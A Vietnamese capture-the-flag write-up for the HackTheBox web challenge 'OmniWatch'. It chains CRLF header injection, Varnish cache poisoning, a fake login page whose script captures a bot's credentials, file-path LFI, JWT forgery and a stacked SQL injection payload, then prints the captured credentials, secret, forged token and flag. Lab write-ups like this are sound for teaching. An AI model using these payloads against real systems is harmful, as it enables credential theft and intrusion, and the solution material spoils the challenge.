# OmniWatch

## 1. Đề bài
Challenge web **Hard** (code-audit, HTB TryOut). Một web app tên "OmniWatch" dùng để theo dõi thiết bị của nhóm lính đánh thuê. Mục tiêu: lấy flag `HTB{...}` chứa **vị trí cuối cùng của đoàn xe caravan**.

- Target: `http://154.57.164.82:31976`
- Có **source code** trong `files/web_omniwatch.zip` → ưu tiên đọc source trước khi đụng remote.

## 2. Kiến thức nền
- **HTTP Response Splitting / CRLF injection**: khi một header value được phản hồi không qua sanitize, kẻ tấn công chèn `\r\n` để bơm thêm header/body.
- **Cache poisoning (Varnish)**: nếu cache key chỉ dựa trên một header do client kiểm soát, ta có thể đưa nội dung độc vào cache để phục vụ cho nạn nhân khác.
- **XSS chạy trong bot**: ứng dụng có một bot (Selenium/Chromium) đăng nhập định kỳ; nếu bot nạp trang do ta kiểm soát, JS của ta chạy với session của bot.
- **Stacked SQL injection** (multi-statement): khi backend cho phép chạy nhiều câu lệnh phân tách bằng `;`.
- **JWT HS256**: nếu lộ secret thì có thể giả mạo token bất kỳ.

## 3. Phân tích source (lỗ hổng)

Kiến trúc (từ `Dockerfile` / `supervisord.conf` / `cache.vcl`):
- **Varnish** (cổng 1337) làm cache proxy đứng trước **Controller (Flask, port 3000)** và **Oracle (Zig, port 4000)**.
- Flag nằm ở `/flag<random>.txt`, chỉ đọc được qua setuid `/readflag`. `/controller/admin` gọi `os.popen("/readflag")` và chỉ dành cho `account_type == administrator`.

**a) CRLF injection trong Oracle (Zig) — `challenge/oracle/src/main.zig`**
```zig
res.header("DeviceId", decodedDeviceId);
```
`decodedDeviceId` được URL-decode và phản hồi trực tiếp vào header `DeviceId`. `response.zig` khi ghi header **không hề chặn `\r\n`**, nên chèn `%0d%0a` trong `deviceId` cho phép bơm header tùy ý (đã chứng minh: `DeviceId: 1` + `Foo: bar`).

**b) Cache key của Varnish chỉ dựa trên `CacheKey` — `config/cache.vcl`**
```
sub vcl_hash { hash_data(req.http.CacheKey); return (lookup); }
sub vcl_backend_response {
  if (beresp.http.CacheKey == "enable") { set beresp.ttl = 10s; ... }
}
```
Cache key = riêng header `CacheKey` của request (bỏ qua URL). Response nào mang header `CacheKey: enable` sẽ được cache 10s. Bơm `Content-Type: text/html` + `CacheKey: enable` vào phản hồi oracle → **biến oracle thành "trang HTML tùy ý" được cache**.

**c) Chi tiết quyết định: header `CacheKey` VẮNG MẶT ≠ header `CacheKey:` rỗng.** Bot/trình duyệt **không** gửi header `CacheKey`. Nếu ta poison bằng `CacheKey:` (rỗng) thì trúng slot khác, bot không bao giờ thấy. Phải poison **không** gửi header `CacheKey` để đúng slot "absent" mà bot lookup.

**d) Không có egress từ container challenge** → webhook không nhận callback. Phải exfil **in-band** qua slot cache.

**e) Login & middleware (controller)** — `application/util/database.py`
```python
def fetch_device(self, device_id):
    query = f"SELECT * FROM devices WHERE device_id = '{device_id}'"   # SQLi
    device = self.query(query, multi=True)[0][0]
```
`device_id` được ghép trực tiếp vào SQL và `query(..., multi=True)` tách bằng `;` → **stacked SQLi**.

`moderator_middleware` xác thực bằng JWT HS256 và so **signature trong cookie với signature lưu trong bảng `signatures`** ("tamper protection"). Nếu ta có secret, forge JWT administrator, rồi dùng SQLi để ghi signature của JWT đó vào DB cho `user_id=1` → middleware chấp nhận.

**f) LFI firmware** — `application/blueprints/routes.py`
```python
file_data = open(os.path.join(os.getcwd(), "application", "firmware", patch)).read()
```
`patch` là path do user kiểm soát; nếu đưa path tuyệt đối `/app/jwt_secret.txt`, `os.path.join` bỏ phần đầu → đọc được secret.

## 4. Vì sao hướng này
Từ source lộ rõ chuỗi: CRLF oracle → cache poisoning Varnish → bot nạp trang ta kiểm soát → chiếm session moderator → (LFI lấy secret + SQLi ghi signature) → forge admin JWT → `/controller/admin` đọc `/readflag`. Đây cũng là chuỗi "chính chủ" của bài.

## 5. Các bước khai thác

1. **CRLF + cache poisoning**: `GET /oracle/<html>/<id>%0d%0aContent-Type: text/html%0d%0aCacheKey: enable` (không gửi header `CacheKey`) → cache "absent" slot chứa trang HTML tùy ý, phục vụ cho mọi request cookie-less (kể cả bot đăng nhập).

2. **Capture moderator credentials in-band**: poison slot absent bằng **trang login giả** có `#username/#password/#login-btn`. Bot (Selenium) đăng nhập → gõ đúng credential moderator vào trường của ta → JS đọc `u.value:p.value`, base64, rồi `fetch('/oracle/json/'+b64+'%0d%0aCacheKey: enable', {headers:{'CacheKey':'owx1'}})` → ghi vào slot cache **riêng** `owx1`. Ta đọc slot `owx1` → giải base64 → được:
   ```
   8a2d334536b2f4146af8cf46acd85110:7f100b7b36092fb9b06dfb4fac360931
   ```

3. **Đăng nhập moderator** → có JWT moderator.

4. **LFI** đọc `/app/jwt_secret.txt` → secret `vq~<Roc} J0` (11 bytes). (Kiểm chứng: JWT moderator từ login verify đúng với secret này.)

5. **Forge admin JWT** (HS256) `{"user_id":1,...,"account_type":"administrator"}`:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6IngiLCJhY2NvdW50X3R5cGUiOiJhZG1pbmlzdHJhdG9yIn0.Ah8sdiGSSqNgeo4-2JnPC0OKdIiXpyjkbFYOXmTcMS0
   ```

6. **Stacked SQLi** ghi signature của admin JWT vào `signatures` cho `user_id=1`:
   ```
   1' OR '1'='1' LIMIT 1; UPDATE signatures SET signature='Ah8sdiGSSqNgeo4-2JnPC0OKdIiXpyjkbFYOXmTcMS0' WHERE user_id=1; -- 
   ```
   ⚠️ **Phải dùng chuỗi literal** `'...'`; dùng `0x<hex>` sẽ lưu kiểu `bytes`, middleware so `str != bytes` → luôn fail.

7. **`GET /controller/admin`** với JWT đã forge → `/readflag` → flag.

## 6. Flag
```
HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_01df607f55a36f0a4512e62e8fa22a28}
```
